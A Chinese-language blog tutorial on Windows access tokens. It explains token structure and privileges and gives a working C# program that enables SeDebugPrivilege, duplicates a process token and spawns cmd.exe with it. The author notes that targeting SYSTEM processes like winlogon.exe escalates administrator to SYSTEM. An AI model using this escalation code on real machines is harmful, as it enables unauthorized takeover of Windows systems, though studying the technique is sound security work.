# windows访问令牌以及相关api函数提权

## windows访问令牌机制

windows的安全访问控制（ACM，access control mode）是由两部分组成的。一个是访问令牌（access tokens），另一个是安全描述符

windows会在用户登录时创建一个访问令牌，包含了用户登录进程返回的SID和由本地安全策略分配给用户和用户的安全组的特权列表。访问令牌是欲进行访问的进程使用的表明自己身份和特权的信息数据

访问令牌是包含12项，分别是：

    当前用户的安全ID，
    当前用户所属组的安全ID。
    当权会话安全ID。
    用户所有的特权列表（包括用户本身，和其所属组）。
    令牌拥有者安全ID。
    用户所属主组群安全ID。
    默认的自由访问控制列表。
    源访问令牌
    表明此令牌是源令牌还是模拟令牌
    可选的链表，表明此令牌限制哪些SID
    当前模拟令牌的级别
    其他数据资料


## 相关api函数

windows依靠访问令牌确认用户的特权，而令牌是可以模拟的。

主要利用点为以下几个api，我把它分为两块

- LookupPrivilegeValue()
- AdjustTokenPrivileges()

---


- OpenProcess()
- OpenProcessToken()
- ImpersonateLoggedOnUser()
- DuplicateTokenEx()
- CreateProcessWithTokenW()

由于我是用c#来写的，所以在引用函数时需要用到`dllimport`

这里记一下各自的`dllimport`


```
[DllImport("kernel32.dll")]
public static extern int OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
```

```
[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccesss, out IntPtr TokenHandle);
```

```
[DllImport("advapi32.dll", SetLastError = true)]
public static extern bool DuplicateTokenEx(
IntPtr hExistingToken,
Int32 dwDesiredAccess,
ref SECURITY_ATTRIBUTES lpThreadAttributes,
Int32 ImpersonationLevel,
Int32 dwTokenType,
ref IntPtr phNewToken);
```

```
[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
public extern static bool DuplicateToken(IntPtr ExistingTokenHandle,
int SECURITY_IMPERSONATION_LEVEL, ref IntPtr DuplicateTokenHandle);
```

```
[DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle,
           [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges,
           ref TOKEN_PRIVILEGES NewState,
           UInt32 Zero,
           IntPtr Null1,
           IntPtr Null2);
```

```
[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName,
            out LUID lpLuid);
```

简记，方便查找，使用时还有诸多参数及结构诸如`TOKEN_QUERY`，`TOKEN_ADJUST_PRIVILEGES`敬请参阅代码

## 提权

原本的windows核心编程中也有靠windows api提权的教学，因为确实有应用程序需要用到高权限，常见的为模拟管理员权限

首先注意一下特权问题，即上一块儿两个函数，主要用于获取特权，我们可以看一下普通用户和管理员用户的特权差别

<img src="https://0xfay.github.io/public/image/172513.jpg">

各个特权就如同他们的描述一样有着各自的作用，但我们这里仅需要enable`SeDebugPrivilege`即可，当然，这些管理员特权基本上只能在有管理员权限下才能开启，所以大多数的提权也都是从administrator提到system。不过某些服务器用户也具有部分特权，导致其也能被提到system（例举iis用户，winserver各版本用户）

>个人踩坑：普通用户也可以开启`SeDebugPrivilege`特权获取其他进程的token，但是想要用token创建新进程还需要`SeImpersonatePrivilege`特权，不然会返回1314权限不足错误，这是普通用户做不到的。同时如果不开启`SeDebugPrivilege`，是无法查看其他进程的token的。

如果不用函数enable特权的话，也可以修改安全组策略获取特权。

然后是提权，用OpenProcess()，获取目标进程的handle，c#中的参数类型为intptr，称为"平台特定的整数类型"。不用其他进程的话可以用GetCurrentProcess()获取自身进程的handle。

用OpenProcessToken()去获取进程的token

再用DuplicateTokenEx()就可以复制token了，除了注意特权问题，还要注意OpenProcessToken()时第二个参数的问题，第二个参数规定了OpenProcessToken()的权限，例如，如果需要修改token所具有的特权，则用`TOKEN_ADJUST_PRIVILEGES`,如果需要复制token，则用`TOKEN_DUPLICATE`（踩坑审了半天才发现，于是无脑`TOKEN_ALL_ACCESS`了

再然后就是通过复制的token创建进程了，CreateProcessWithTokenW()，如此一来就得到了一个用某进程的token创建而来的进程

代码附上,这是用自身创建的进程。如果需要用其他应用token创建新进程，则需要修改OpenProcessToken()中第一个GetCurrentProcess()为其他应用的handle，可以结合GetWindowThreadProcessId()，FindWindow()等函数，或者手动获取pid通过参数传入。

```
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace process
{
    class createprogress {
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;

        }

        internal enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        internal enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }



        [StructLayout(LayoutKind.Sequential)]
        internal struct SECURITY_ATTRIBUTES
        {
            public uint nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }


        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle,
            UInt32 DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool DuplicateTokenEx(
        IntPtr hExistingToken,
        Int32 dwDesiredAccess,
        ref SECURITY_ATTRIBUTES lpThreadAttributes,
        Int32 ImpersonationLevel,
        Int32 dwTokenType,
        ref IntPtr phNewToken);
   
        [DllImport("advapi32.dll", EntryPoint = "CreateProcessWithTokenW", SetLastError = true,
                             CharSet = CharSet.Unicode,
                             CallingConvention = CallingConvention.StdCall)]
        private extern static bool CreateProcessWithTokenW(
            IntPtr hToken,
            uint dwLogonFlags,
            String lpApplicationName,
            String lpCommandLine,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            String lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();

        private const int GENERIC_ALL_ACCESS = 0x10000000;

        public const uint LOGON_WITH_PROFILE = 00000001;
        public const uint NORMAL_PRIORITY_CLASS = 0x00000020;
        private const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
        private static uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        private static uint STANDARD_RIGHTS_READ = 0x00020000;
        private static uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        private static uint TOKEN_DUPLICATE = 0x0002;
        private static uint TOKEN_IMPERSONATE = 0x0004;
        private static uint TOKEN_QUERY = 0x0008;
        private static uint TOKEN_QUERY_SOURCE = 0x0010;
        private static uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        private static uint TOKEN_ADJUST_GROUPS = 0x0040;
        private static uint TOKEN_ADJUST_DEFAULT = 0x0080;
        private static uint TOKEN_ADJUST_SESSIONID = 0x0100;
        private static uint TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
        private static uint TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
            TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
            TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
            TOKEN_ADJUST_SESSIONID);


        public static int CreateProgressTest() {
            IntPtr tokenhandle;

            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, out tokenhandle))
            {
                Console.WriteLine("[!] failed open process token");
                return 100;
                //Console.WriteLine(OpenThreadToken((IntPtr)calcProcess, TOKEN_ADJUST_PRIVILEGES, false, out tokenhandle));
            };
            Console.WriteLine("[+] success open process token ");
            IntPtr newtoken = IntPtr.Zero;
            SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();


            if (!DuplicateTokenEx(tokenhandle, (int)(TOKEN_ALL_ACCESS), ref sa, (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, (int)TOKEN_TYPE.TokenPrimary, ref newtoken))
            {
                Console.WriteLine((int)(TOKEN_ALL_ACCESS));
                Console.WriteLine(TOKEN_ALL_ACCESS);
                Console.WriteLine("[!] failed duplicating process token ");
                int error = Marshal.GetLastWin32Error();
                string message = String.Format("DuplicateTokenEx Error: {0}", error);
                Console.WriteLine(message);
                return 101;
            }
            Console.WriteLine("[+] success duplicating process token ");

            String processpath = "C:\\Windows\\System32\\cmd.exe";

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();

            if (!CreateProcessWithTokenW(newtoken, LOGON_WITH_PROFILE, null, processpath, NORMAL_PRIORITY_CLASS | CREATE_UNICODE_ENVIRONMENT, IntPtr.Zero, null, ref si, out pi)) {
                Console.WriteLine("[!] failed create process with token ");
                int error = Marshal.GetLastWin32Error();
                string message = String.Format("CreateProcessWithTokenW Error: {0}", error);
                Console.WriteLine(message);
                return 102;
            }

            Console.WriteLine("[+] success create process with token");

            return 103;
        }

    }
    class Priviledge
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle,
            UInt32 DesiredAccess, out IntPtr TokenHandle);

        private static uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        private static uint STANDARD_RIGHTS_READ = 0x00020000;
        private static uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        private static uint TOKEN_DUPLICATE = 0x0002;
        private static uint TOKEN_IMPERSONATE = 0x0004;
        private static uint TOKEN_QUERY = 0x0008;
        private static uint TOKEN_QUERY_SOURCE = 0x0010;
        private static uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        private static uint TOKEN_ADJUST_GROUPS = 0x0040;
        private static uint TOKEN_ADJUST_DEFAULT = 0x0080;
        private static uint TOKEN_ADJUST_SESSIONID = 0x0100;
        private static uint TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
        private static uint TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
            TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
            TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
            TOKEN_ADJUST_SESSIONID);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName,
            out LUID lpLuid);
        public const string SE_ASSIGNPRIMARYTOKEN_NAME = "SeAssignPrimaryTokenPrivilege";

        public const string SE_AUDIT_NAME = "SeAuditPrivilege";

        public const string SE_BACKUP_NAME = "SeBackupPrivilege";

        public const string SE_CHANGE_NOTIFY_NAME = "SeChangeNotifyPrivilege";

        public const string SE_CREATE_GLOBAL_NAME = "SeCreateGlobalPrivilege";

        public const string SE_CREATE_PAGEFILE_NAME = "SeCreatePagefilePrivilege";

        public const string SE_CREATE_PERMANENT_NAME = "SeCreatePermanentPrivilege";

        public const string SE_CREATE_SYMBOLIC_LINK_NAME = "SeCreateSymbolicLinkPrivilege";

        public const string SE_CREATE_TOKEN_NAME = "SeCreateTokenPrivilege";

        public const string SE_DEBUG_NAME = "SeDebugPrivilege";

        public const string SE_ENABLE_DELEGATION_NAME = "SeEnableDelegationPrivilege";

        public const string SE_IMPERSONATE_NAME = "SeImpersonatePrivilege";

        public const string SE_INC_BASE_PRIORITY_NAME = "SeIncreaseBasePriorityPrivilege";

        public const string SE_INCREASE_QUOTA_NAME = "SeIncreaseQuotaPrivilege";

        public const string SE_INC_WORKING_SET_NAME = "SeIncreaseWorkingSetPrivilege";

        public const string SE_LOAD_DRIVER_NAME = "SeLoadDriverPrivilege";

        public const string SE_LOCK_MEMORY_NAME = "SeLockMemoryPrivilege";

        public const string SE_MACHINE_ACCOUNT_NAME = "SeMachineAccountPrivilege";

        public const string SE_MANAGE_VOLUME_NAME = "SeManageVolumePrivilege";

        public const string SE_PROF_SINGLE_PROCESS_NAME = "SeProfileSingleProcessPrivilege";

        public const string SE_RELABEL_NAME = "SeRelabelPrivilege";

        public const string SE_REMOTE_SHUTDOWN_NAME = "SeRemoteShutdownPrivilege";

        public const string SE_RESTORE_NAME = "SeRestorePrivilege";

        public const string SE_SECURITY_NAME = "SeSecurityPrivilege";

        public const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";

        public const string SE_SYNC_AGENT_NAME = "SeSyncAgentPrivilege";

        public const string SE_SYSTEM_ENVIRONMENT_NAME = "SeSystemEnvironmentPrivilege";

        public const string SE_SYSTEM_PROFILE_NAME = "SeSystemProfilePrivilege";

        public const string SE_SYSTEMTIME_NAME = "SeSystemtimePrivilege";

        public const string SE_TAKE_OWNERSHIP_NAME = "SeTakeOwnershipPrivilege";

        public const string SE_TCB_NAME = "SeTcbPrivilege";

        public const string SE_TIME_ZONE_NAME = "SeTimeZonePrivilege";

        public const string SE_TRUSTED_CREDMAN_ACCESS_NAME = "SeTrustedCredManAccessPrivilege";

        public const string SE_UNDOCK_NAME = "SeUndockPrivilege";

        public const string SE_UNSOLICITED_INPUT_NAME = "SeUnsolicitedInputPrivilege";
        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public UInt32 LowPart;
            public Int32 HighPart;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_PRIVILEGES
        {
            public UInt32 PrivilegeCount;
            public LUID Luid;
            public UInt32 Attributes;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public UInt32 Attributes;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hHandle);

        public const UInt32 SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001;
        public const UInt32 SE_PRIVILEGE_ENABLED = 0x00000002;
        public const UInt32 SE_PRIVILEGE_REMOVED = 0x00000004;
        public const UInt32 SE_PRIVILEGE_USED_FOR_ACCESS = 0x80000000;

        // Use this signature if you do not want the previous state
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle,
           [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges,
           ref TOKEN_PRIVILEGES NewState,
           UInt32 Zero,
           IntPtr Null1,
           IntPtr Null2);

        public static int EnableDebugPri()
        {
            IntPtr hToken;
            LUID luidSEDebugNameValue;
            TOKEN_PRIVILEGES tkpPrivileges;

            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
            {
                Console.WriteLine("OpenProcessToken() failed, error = {0} . SeDebugPrivilege is not available", Marshal.GetLastWin32Error());
                return -8;
            }
            else
            {
                Console.WriteLine("OpenProcessToken() successfully");
            }

            if (!LookupPrivilegeValue(null, SE_DEBUG_NAME, out luidSEDebugNameValue))
            {
                Console.WriteLine("LookupPrivilegeValue() failed, error = {0} .SeDebugPrivilege is not available", Marshal.GetLastWin32Error());
                CloseHandle(hToken);
                return -7;
            }
            else
            {
                Console.WriteLine("LookupPrivilegeValue() successfully");
            }

            tkpPrivileges.PrivilegeCount = 1;
            tkpPrivileges.Luid = luidSEDebugNameValue;
            tkpPrivileges.Attributes = SE_PRIVILEGE_ENABLED;

            if (!AdjustTokenPrivileges(hToken, false, ref tkpPrivileges, 0, IntPtr.Zero, IntPtr.Zero))
            {
                Console.WriteLine("LookupPrivilegeValue() failed, error = {0} .SeDebugPrivilege is not available", Marshal.GetLastWin32Error());
            }
            else
            {
                Console.WriteLine("SeDebugPrivilege is now available");
            }
            CloseHandle(hToken);
            Console.ReadLine();
            return 1;
        }
    }
    class Program
    {
        public const uint TOKEN_QUERY = 0x0008;
        public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public const uint SE_PRIVILEGE_ENABLED = 0x00000002;


        [DllImport("Advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccesss, out IntPtr TokenHandle);

        [DllImport("kernel32.dll")]
        public static extern int OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        static void Main(string[] args)
        {
            //IntPtr tokenHandle = IntPtr.Zero;
            //IntPtr a = new IntPtr(Process.GetCurrentProcess().Id);
            //Console.WriteLine(a);

            //if (!OpenProcessToken(a, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out tokenHandle)) {
            //    Console.WriteLine("failed to open process token");
            //};
            Priviledge.EnableDebugPri();
            //Console.WriteLine("当前用户是: " + WindowsIdentity.GetCurrent().Name);
            createprogress.CreateProgressTest();
            Console.ReadLine();

        }
    }
}

```

过程中能清楚的认识到，每个进程的token都是相对独立的，即你修改某个进程的特权，并不会影响到其他进程，也不会影响到该用户。而且token间有种类似继承的关系，就像用户创建进程，进程创建子进程，他们所获取的特权一样。

再进一步，如果想提权到system，则找system进程获取token即可，如`winlogon.exe`,`dllhost.exe`,`EvtEng.exe`,`ChsIME.exe`(似乎是微软的中文输入法)等等等等...还蛮多的，打开进程列表随便找个system进程试试，有些可以有些不行（暂不清楚原因，有0005拒绝访问的，有0087参数错误的，或许大多都与进程有关。



